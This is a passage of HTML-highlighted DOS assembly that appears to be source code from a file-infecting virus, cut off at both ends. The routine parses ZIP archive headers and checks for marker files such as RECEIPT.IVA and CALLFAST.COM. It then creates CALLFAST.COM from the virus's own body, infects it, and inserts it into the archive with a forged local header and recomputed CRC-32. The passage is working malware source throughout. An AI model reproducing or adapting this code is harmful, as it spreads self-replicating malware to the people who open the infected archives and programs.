         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">       </span><span class="sc1">; Byte of filename equal to byte o...</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">calc_lfh_ptr</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to calc_lfh_ptr</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">receipt_loop</span><span class="sc0">
</span><span class="sc5">found_receip</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Found RECEIPT.IVA</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store found RECEIPT.IVA</span><span class="sc0">
</span><span class="sc5">calc_lfh_ptr</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DX = low-order word of compresse...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; CX = high-order word of compress...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = extra field length</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Add extra field length to compre...</span><span class="sc0">
         </span><span class="sc6">adc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; Convert to 32-bit</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_pos_cfp</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">next_lfh_sig</span><span class="sc0">
</span><span class="sc5">zero_cdh_num</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; No central directory file header...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store no central directory file ...</span><span class="sc0">
</span><span class="sc5">copy_cds</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = number of central directory...</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; Increase number of central direc...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store number of central director...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of ZIP file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2ah</span><span class="sc0">      </span><span class="sc1">; Read forty-two bytes</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_file</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">0ah</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of !#TEMP#!</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_file_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; CX = filename length</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">1ah</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = extra field length</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; Add extra field length to filena...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file comment length</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; CX = number of bytes to read</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of ZIP file</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_file_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">0ah</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of !#TEMP#!</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_file_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">      </span><span class="sc1">; Read four bytes</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of ZIP file</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_file_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">00h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = low-order word of end of ce...</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'KP'</span><span class="sc0">             </span><span class="sc1">; Found low-order word of end of ...?</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">test_eoc_sig</span><span class="sc0">    </span><span class="sc1">; Equal? Jump to test_eoc_sig</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">call_mark_</span><span class="sc0">
</span><span class="sc5">test_eoc_sig</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = high-order word of end of c...</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">605h</span><span class="sc0">         </span><span class="sc1">; Found high-order word of end of ...</span><span class="sc0">
         </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">copy_eocds</span><span class="sc0">      </span><span class="sc1">; Equal? Jump to read_oecds</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">copy_cds</span><span class="sc0">
</span><span class="sc5">copy_eocds</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of ZIP file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">12h</span><span class="sc0">      </span><span class="sc1">; Read eightteen bytes</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_file</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = low-order word of offset of...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store low-order word of offset o...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = high-order word of offset o...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store high-order word of offset ...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">0ah</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of !#TEMP#!</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_file_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; CX = zipfile comment length</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of ZIP file</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">read_file_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">0ah</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of !#TEMP#!</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_file_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = found REQUEST.IVA</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Didn't found REQUEST.IVA</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">test_callfas</span><span class="sc0">    </span><span class="sc1">; Zero? Jump to test_callfas</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">test_receipt</span><span class="sc0">
</span><span class="sc5">test_callfas</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">0eh</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = found CALLFAST.COM</span><span class="sc0">
         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Didn't found CALLFAST.COM</span><span class="sc0">
         </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">create_file_</span><span class="sc0">    </span><span class="sc1">; Zero? Jump to create_file_</span><span class="sc0">

         </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">call_mark_</span><span class="sc0">
</span><span class="sc5">create_file_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">callfast_com</span><span class="sc0">     </span><span class="sc1">; DX = offset of callfast_com</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store file handle of CALLFAST.COM</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of CALLFAST.COM</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">file_end</span><span class="sc4">-</span><span class="sc5">file_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_begin</span><span class="sc0">   </span><span class="sc1">; DX = offset of file_begin</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_file_</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">close_file</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">      </span><span class="sc1">; Don't test filesize</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">tst_filesize</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; Store don't test filesize</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">callfast_com</span><span class="sc0">     </span><span class="sc1">; DX = offset of callfast_com</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">inf_com_exe</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Test filesize</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">tst_filesize</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; Store test filesize</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack (CS)</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">callfast_com</span><span class="sc0">     </span><span class="sc1">; SI = offset of callfast_com</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">filename</span><span class="sc0">     </span><span class="sc1">; DI = offset of filename</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">      </span><span class="sc1">; Move thirteen bytes</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">       </span><span class="sc1">; Move CALLFAST.COM to filename</span><span class="sc0">
</span><span class="sc5">open_filenam</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">filename</span><span class="sc0">     </span><span class="sc1">; DX = offset of filename</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">open_file</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_pos_eof</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">1ch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store low-order word of filesize</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">1ah</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">; Store high-order word of filesize</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">calc_crc32</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">20h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store low-order word of CRC-32 c...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">1eh</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">; Store high-order word of CRC-32 ...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; BX = file handle of ZIP file</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; CX = high-order word of offset o...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DX = low-order word of offset of...</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">set_pos_sof_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; AX = code segment</span><span class="sc0">
         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">+</span><span class="sc2">0fh</span><span class="sc4">)/</span><span class="sc2">10h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of data buffer</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'KP'</span><span class="sc0">             </span><span class="sc1">; AX = low-order word of local hea...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">00h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store low-order word of local he...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">403h</span><span class="sc0">         </span><span class="sc1">; AX = high-order word of local hea...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store high-order word of local he...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">      </span><span class="sc1">; AX = version needed to extract (v...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store version needed to extract (...</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; AX = general purpose bit flag and...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store general purpose bit flag</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store compression method (the fil...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3021h</span><span class="sc0">        </span><span class="sc1">; AX = last modified file time</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0ah</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store last modified file time</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1ae1h</span><span class="sc0">        </span><span class="sc1">; AX = last modified file date</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0ch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store last modified file date</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = low-order word of CRC-32 ch...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store low-order word of CRC-32 c...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">1eh</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = high-order word of CRC-32 c...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store high-order word of CRC-32 ...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">1ch</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = low-order word of filesize</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store low-order word of compress...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store low-order word of uncompre...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">-</span><span class="sc2">1ah</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; AX = high-order word of filesize</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store high-order word of compres...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store high-order word of uncompr...</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">      </span><span class="sc1">; AX = filename length (12 bytes)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">1ah</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store filename length (12 bytes)</span><span class="sc0">
         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; AX = extra field length (0 bytes)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">1ch</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">; Store extra field length (0 bytes)</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">      </span><span class="sc1">; Write thirty bytes</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_file</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">filename</span><span class="sc0">     </span><span class="sc1">; DX = offset of filename</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">      </span><span class="sc1">; Write twelve bytes</span><span class="sc0">
         </span><span class="sc6">nop</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">write_file_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">       </span><span class="sc1">; AX = code segment</span><span class="sc0">
